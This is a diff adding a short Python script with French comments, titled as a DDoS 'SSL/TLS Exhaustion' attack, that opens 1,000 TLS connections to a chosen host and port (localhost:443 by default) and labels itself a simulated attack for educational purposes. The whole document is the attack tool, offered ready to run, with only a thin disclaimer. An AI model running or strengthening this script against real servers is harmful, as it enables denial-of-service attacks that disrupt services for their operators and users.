@@ -1,0 +1,24 @@
+# DDOS - Attaques par exploitation de protocoles (SSL/TLS Exhaustion)
+
+import socket
+import ssl
+
+def ssl_exhaustion(target_ip, target_port, num_connections):
+    print(f"Lancement d'une attaque SSL/TLS Exhaustion sur {target_ip}:{target_port}...")
+    for _ in range(num_connections):
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        ssl_sock = ssl.wrap_socket(sock)
+        try:
+            ssl_sock.connect((target_ip, target_port))
+        except Exception as e:
+            print(f"Erreur lors de l'établissement de la connexion SSL/TLS: {e}")
+        finally:
+            ssl_sock.close()
+
+# Paramètres de l'attaque simulée (à des fins éducatives uniquement)
+target_ip = "127.0.0.1"  # Adresse IP de la cible (localhost dans cet exemple)
+target_port = 443        # Port de la cible (HTTPS)
+num_connections = 1000   # Nombre de connexions SSL/TLS à établir
+
+# Lancer l'attaque simulée
+ssl_exhaustion(target_ip, target_port, num_connections)
